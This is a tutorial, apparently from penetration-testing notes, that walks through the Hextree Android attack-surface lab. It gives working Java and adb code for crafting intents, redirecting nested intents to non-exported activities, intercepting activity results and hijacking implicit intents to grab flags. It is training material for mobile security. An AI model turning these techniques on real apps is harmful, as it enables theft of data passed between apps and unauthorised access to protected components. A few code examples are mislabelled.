---
title: "Intent attack surface"
description: "Learn about Android Intent attack surfaces, how to start activities, handle incoming intents, and send intents using adb for penetration testing."
---

## Introduction

An **Intent** is an object that facilitates communication between components of an Android application. It is commonly used to **start activities**, **start services**, or **deliver broadcasts** to a **receiver**.

An Intent can encapsulate several types of information \[[↗](https://developer.android.com/guide/components/intents-filters#Building)]:

* Component name - The name of the component to start (optional).
* Action - Specifies the general action to be performed (e.g., view, send, or edit).
* Category - Provides additional information about the action, helping Android determine the appropriate component to handle it.
* Type - Defines the MIME type of the data being handled (e.g., "image/png", "text/plain").
* Data - Refers to the actual data the Intent operates on, often represented as a URI.
* Extras - Key-value pairs that carry additional information required to accomplish the requested action.
* Flags - Provide additional instructions on how the component should be launched (e.g., start in a new task or clear existing activities).

Intents can be explicit or implicit.

### Explicit intent

An intent is called **explicit** when you specify the exact component.

Use case: Starting a specific activity or service, etc.

```java
Intent intent = new Intent();
intent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag2Activity"
));
intent.setAction("io.hextree.action.GIVE_FLAG");
startActivity(intent);
```

### Implicit intent

An intent is called **explicit** you don't specify component name.

Use case: Open a web page, send an email, share content, take a photo, etc.

```java
Intent intent = new Intent();
intent.setAction("android.media.action.IMAGE_CAPTURE");
startActivity(intent);
```

When you use implicit intents you’re asking Android to perform an action, not specifying which app should do it. An **Intent Filter** declares what types of intents an Activity (or Service, or BroadcastReceiver) can respond to. You put it in the `AndroidManifest.xml` file.

```xml
<activity ... >
    <intent-filter>
        <action android:name="android.media.action.IMAGE_CAPTURE"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</activity>
```

### Retrieve Intent

`getIntent()` is a method in Android to access that intent and extract any data that was sent.

---

## Send intent with adb

```sh
# Syntax
adb shell am start -a <ACTION> -d <DATA> -n <PACKAGE>/<CLASS-COMPONENT>

# Example
adb shell am start -a com.package.action.GIVE_FLAG -d "https://test.com" -n com.package/com.package.test.MainActivity
```

---

## Examples

### Basic exported activity

Let's say that the app `io.hextree.attacksurface` has the following activity:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag1Activity"
    android:exported="true"/>
```

To start this activity you can send an intent as follows:

```java
// 1 way
Intent intent = new Intent();
intent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag2Activity"
));
intent.setAction("io.hextree.action.GIVE_FLAG");
startActivity(intent);
```

```java
// 2 way
Intent intent = new Intent();
intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag2Activity");
startActivity(intent);
```

---

### Intent with specific action

Let's say that the app `io.hextree.attacksurface` has the following activity:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag2Activity"
    android:exported="true">
    <intent-filter>
        <action android:name="io.hextree.action.GIVE_FLAG"/>
    </intent-filter>
</activity>
```

```java
public class Flag2Activity extends AppCompactActivity {
    public Flag2Activity() {...}

    protected void onCreate(Bundle bundle) {
        ...
        String action = getIntent().getAction();
        if (action == null || !action.equals("io.hextree.action.GIVE_FLAG")) {
            return;
        }
        ...
        success(this);
    }
}
```

To start this activity you can send an intent as follows:

```java
Intent intent = new Intent();
intent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag2Activity"
));
intent.setAction("io.hextree.action.GIVE_FLAG");
startActivity(intent);
```

---

### Intent with data URI

Let's say that the app `io.hextree.attacksurface` has the following activitiy:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag3Activity"
    android:exported="true">
    <intent-filter>
        <action android:name="io.hextree.action.GIVE_FLAG"/>
        <data android:scheme="https"/>
    </intent-filter>
</activity>
```

```java
public class Flag3Activity extends AppCompactActivity {
    public Flag3Activity() {...}

    protected void onCreate(Bundle bundle) {
        ...
        Intent intent = getIntent();
        String action = intent.getAction();
        if (action == null || !action.equals("io.hextree.action.GIVE_FLAG")) {
            return;
        }
        Uri data = intent.getData();
        if (data == null || !data.toString().equals("https://app.hextree.io/map/android")) {
            return;
        }
        ...
        success(this);
    }
}
```

To start this activity you can send an intent as follows:

```java
Intent intent = new Intent();
intent.setAction("io.hextree.action.GIVE_FLAG");
intent.setData(Uri.parse("https://app.hextree.io/map/android"));
intent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag3Activity"
));
startActivity(intent);
```

---

### Multiple intents

Let's say that the app `io.hextree.attacksurface` has the following activity:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag4Activity"
    android:exported="true"/>
```

```java
public class Flag4Activity extends AppCompactActivity {
    public Flag4Activity() {...}

    public enum State {...}

    protected void onCreate(Bundle bundle) {
        ...
        stateMachine(getIntent());
    }

    private State getCurrentState() {...}

    private void setCurrentState(State state) {...}

    public void stateMachine(Intent intent) {
        String action = intent.getAction();
        int iOrdinal = getCurrentState().ordinal();
        if (iOrdinal != 0) {
            if (iOrdinal != 1) {
                if (iOrdinal != 2) {
                    if (iOrdinal == 3) {
                        this.f182f.addTag(State.GET_FLAG);
                        setCurrentState(State.INIT);
                        success(this);
                        Log.i("Flag4StateMachine", "solved");
                        return;
                    }
                    if (iOrdinal == 4 && "INIT_ACTION".equals(action)) {
                        setCurrentState(State.INIT);
                        Toast.makeText(this, "Transitioned from REVERT to INIT", 0).show();
                        Log.i("Flag4StateMachine", "Transitioned from REVERT to INIT");
                        return;
                    }
                } else if ("GET_FLAG_ACTION".equals(action)) {
                    setCurrentState(State.GET_FLAG);
                    Toast.makeText(this, "Transitioned from BUILD to GET_FLAG", 0).show();
                    Log.i("Flag4StateMachine", "Transitioned from BUILD to GET_FLAG");
                    return;
                }
            } else if ("BUILD_ACTION".equals(action)) {
                setCurrentState(State.BUILD);
                Toast.makeText(this, "Transitioned from PREPARE to BUILD", 0).show();
                Log.i("Flag4StateMachine", "Transitioned from PREPARE to BUILD");
                return;
            }
        } else if ("PREPARE_ACTION".equals(action)) {
            setCurrentState(State.PREPARE);
            Toast.makeText(this, "Transitioned from INIT to PREPARE", 0).show();
            Log.i("Flag4StateMachine", "Transitioned from INIT to PREPARE");
            return;
        }
        Toast.makeText(this, "Unknown state. Transitioned to INIT", 0).show();
        Log.i("Flag4StateMachine", "Unknown state. Transitioned to INIT");
        setCurrentState(State.INIT);
    }
```

To get the flag in this case you need to send more than one intent.

1 intent:

```java
Intent intent = new Intent();
intent.setAction("PREPARE_ACTION");
intent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag4Activity"
));
startActivity(intent);
```

2 intent:

```java
Intent intent = new Intent();
intent.setAction("BUILD_ACTION");
intent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag4Activity"
));
startActivity(intent);
```

3 intent:

```java
Intent intent = new Intent();
intent.setAction("GET_FLAG_ACTION");
intent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag4Activity"
));
startActivity(intent);
```

4 intent:

```java
Intent intent = new Intent();
intent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag4Activity"
));
startActivity(intent);
```

---

### Innested intents

Let's say that the app `io.hextree.attacksurface` has the following activity:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag5Activity"
    android:exported="true"/>
```

```java
public class Flag5Activity extends AppCompactActivity {
    Intent nextIntent = null;

    public Flag5Activity() {...}

    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.f182f = new LogHelper(this);
        Intent intent = getIntent();
        Intent intent2 = (Intent) intent.getParcelableExtra("android.intent.extra.INTENT");
        if (intent2 == null || intent2.getIntExtra("return", -1) != 42) {
            return;
        }
        this.f182f.addTag(42);
        Intent intent3 = (Intent) intent2.getParcelableExtra("nextIntent");
        this.nextIntent = intent3;
        if (intent3 == null || intent3.getStringExtra("reason") == null) {
            return;
        }
        this.f182f.addTag("nextIntent");
        if (this.nextIntent.getStringExtra("reason").equals("back")) {
            this.f182f.addTag(this.nextIntent.getStringExtra("reason"));
            success(this);
        } else if (this.nextIntent.getStringExtra("reason").equals("next")) {
            intent.replaceExtras(new Bundle());
            startActivity(this.nextIntent);
        }
    }
}
```

To solve this challenge you can send an intent as follows:

```java
Intent thirdIntent = new Intent();
thirdIntent.putExtra("reason", "back");

Intent secondIntent = new Intent();
secondIntent.putExtra("return", 42);
secondIntent.putExtra("nextIntent", thirdIntent);

Intent firstIntent = new Intent();
firstIntent.putExtra("android.intent.extra.INTENT", secondIntent);
firstIntent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag5Activity"
));
startActivity(firstIntent);
```

---

### Other threat surface

The most common way for an attack to happen is through the `onCreate()` method, which handles the incoming intent from `getIntent()`. But the activity lifecycle is a bit more complicated, so there might be other ways that a threat could be introduced.

Let's say that the app `io.hextree.attacksurface` has the following activity:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag7Activity"
    android:exported="true"/>
```

```java
public class Flag7Activity extends AppCompactActivity {
    public Flag7Activity() {...}

    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        if (this.f182f == null) {
            this.f182f = new LogHelper(this);
        }
        String action = getIntent().getAction();
        if (action == null || !action.equals("OPEN")) {
            return;
        }
        this.f182f.addTag("OPEN");
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        String action = intent.getAction();
        if (action == null || !action.equals("REOPEN")) {
            return;
        }
        this.f182f.addTag("REOPEN");
        success(this);
    }
}
```

To get this flag we need to find a way to execute the `onNewIntent` method. If you read the documentation (https://developer.android.com/reference/android/app/Activity#onNewIntent(android.content.Intent)) you can see that:

> This is called for activities that set launchMode to "singleTop" in their package, or if a client used the `Intent.FLAG_ACTIVITY_SINGLE_TOP` flag when calling `startActivity(Intent)`.

To solve this challenge you can send the following intents:

```java
Intent firstIntent = new Intent();
firstIntent.setAction("OPEN");
firstIntent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag7Activity"
));
startActivity(firstIntent);

// Wait for the app to start
try {
    Thread.sleep(3000);
} catch (InterruptedException e) {
    throw new RuntimeException(e);
}

Intent secondIntent = new Intent();
secondIntent.setAction("REOPEN");
secondIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
secondIntent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag7Activity"
));
startActivity(secondIntent);
```

---

## Vulnerabilities

### Intent redirect

An *Intent Redirect* vulnerability means that an attacker can control the intent used by the other app to for example start an activity. This can be particularly dangerous when an activity is not exported and therefore cannot normally be started externally. By exploiting the vulnerability, the attacker can trick the app into starting the activity internally on their behalf.

Let's say that the app `io.hextree.attacksurface` has the following activity:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag6Activity"
    android:exported="false"/>
```

```java
public class Flag6Activity extends AppCompactActivity {
    public Flag6Activity() {...}

    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.f182f = new LogHelper(this);
        if ((getIntent().getFlags() & 1) != 0) {
            this.f182f.addTag("FLAG_GRANT_READ_URI_PERMISSION");
            success(this);
        }
    }
}
```

We cannot start this activity from another app because it's not exported. However, if we have a `startActivity` within the app where the attacker controls the intent we can craft an intent that when passed to `startActivity`, leads to the non-exported activity.

The [Innested intents](intent%20attack%20surface.html#innested-intents) chapter includes a useful code:

```java
...
} else if (this.nextIntent.getStringExtra("reason").equals("next")) {
    intent.replaceExtras(new Bundle());
    startActivity(this.nextIntent);
...
```

To start this activity you can send an intent as follows:

```java
Intent thirdIntent = new Intent();
thirdIntent.putExtra("reason", "next");
thirdIntent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag6Activity"
));
thirdIntent.addFlags(1);

Intent secondIntent = new Intent();
secondIntent.putExtra("return", 42);
secondIntent.putExtra("nextIntent", thirdIntent);

Intent firstIntent = new Intent();
firstIntent.putExtra("android.intent.extra.INTENT", secondIntent);
firstIntent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag5Activity"
));
startActivity(firstIntent);
```

### Intercept activity results

It's important to remember that starting activities is not just a one-way communication. When you start an activity with `startActivityForResult()`, you can also get a result back from the caller.

Let's say that the app `io.hextree.attacksurface` has the following activity:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag9Activity"
    android:exported="true"/>
```

```java
public class Flag9Activity extends AppCompactActivity {
    public Flag9Activity() {...}

    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        ComponentName callingActivity = getCallingActivity();
        if (callingActivity == null || !callingActivity.getClassName().contains("Hextree")) {
            return;
        }
        Intent intent = new Intent("flag");
        intent.putExtra("flag", this.f182f.appendLog(this.flag));
        setResult(-1, intent);
        finish();
        success(this);
    }
}
```

Basically, when this activity starts, it checks who launched it.
If the launcher’s class name contains "Hextree", it creates an Intent containing a “flag” value, marks the result as successful, sends it back to the caller, closes itself, and logs the success.

In this case you can get the flag by using `onActivityResult()`.

```java
public class MainHextreeActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        ...
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag9Activity"
        ));
        startActivityForResult(intent, 5);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        String flag = data.getStringExtra("flag");
        Log.d("Flag", flag);
    }
}
```

### Hijack implicit intents

Receiving implicit intents can lead to common security issues. If an app uses implicit intents insecurely, for example, by transmitting sensitive data, then registering a handler for that intent could potentially be exploited by malicious components.

Let's say that the app `io.hextree.attacksurface` has the following activity:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag10Activity"
    android:exported="false"/>
```

```java
public class Flag10Activity extends AppCompactActivity {
    public Flag10Activity() {...}

    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        if (getIntent().getAction() == null) {
            Intent intent = new Intent("io.hextree.attacksurface.ATTACK_ME");
            intent.addFlags(8);
            intent.putExtra("flag", this.f182f.appendLog(this.flag));
            try {
                startActivity(intent);
                success(this);
            } catch (RuntimeException e) {
                e.printStackTrace();
                finish();
            }
        }
    }
}
```

To obtain this flag, register an intent filter with the action `io.hextree.attacksurface.ATTACK_ME` as follows:

```xml
<activity
    android:name=".MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>
    <intent-filter>
        <action android:name="io.hextree.attacksurface.ATTACK_ME" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

```java
Intent intent = getIntent();
String flag = intent.getStringExtra("flag");
if (flag != null) {
    Log.d("flag", flag);
} else {
    Log.w("flag", "No flag found in intent");
}
```

<details>
<summary>
Another example (1)
</summary>

Let’s say that the app `io.hextree.attacksurface` has the following activity:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag11Activity"
    android:exported="false"/>
```

```java
public class Flag11Activity extends AppCompactActivity {
    public Flag11Activity() {...}

    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        if (getIntent().getAction() == null) {
            Intent intent = new Intent("io.hextree.attacksurface.ATTACK_ME");
            intent.addFlags(8);
            try {
                startActivityForResult(intent, 42);
            } catch (RuntimeException e) {
                e.printStackTrace();
                finish();
            }
        }
    }

    @Override
    protected void onActivityResult(int i, int i2, Intent intent) {
        if (intent != null && intent.getIntExtra("token", -1) == 1094795585) {
            success(this);
        }
        super.onActivityResult(i, i2, intent);
    }
}
```

To obtain this flag, register an intent filter with the action `io.hextree.attacksurface.ATTACK_ME` as follows:

```xml
<activity
    android:name=".MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>
    <intent-filter>
        <action android:name="io.hextree.attacksurface.ATTACK_ME" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

```java
Intent intent = new Intent();
intent.putExtra("token", 1094795585);
setResult(5, intent);
```

</details>


<details>
<summary>
Another example (2)
</summary>

Let’s say that the app `io.hextree.attacksurface` has the following activity:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag12Activity"
    android:exported="true"/>
```

```java
public class Flag12Activity extends AppCompactActivity {
    public Flag12Activity() {...}

    @Override 
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        if (getIntent().getAction() == null) {
            Intent intent = new Intent("io.hextree.attacksurface.ATTACK_ME");
            intent.addFlags(8);
            try {
                startActivityForResult(intent, 42);
            } catch (RuntimeException e) {
                e.printStackTrace();
                finish();
            }
        }
    }

    @Override
    protected void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        if (intent == null || getIntent() == null || !getIntent().getBooleanExtra("LOGIN", false)) {
            return;
        }
        if (intent.getIntExtra("token", -1) == 1094795585) {
            success(this);
        }
    }
}
```

To obtain this flag, create two activities and register an intent filter with the action `io.hextree.attacksurface.ATTACK_ME` as follows:

```xml
<activity
    android:name=".SecondActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="io.hextree.attacksurface.ATTACK_ME" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>

<activity
    android:name=".MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>
</activity>
```

```java
// MainActivity
Intent intent = new Intent();
intent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag12Activity"
));
intent.putExtra("LOGIN", true);
startActivity(intent);

//SecondActivity
Intent intent = getIntent();
if (intent != null) {
    Intent intentResult = new Intent();
    intentResult.putExtra("token", 1094795585);
    setResult(RESULT_OK, intentResult);
}
```
</details>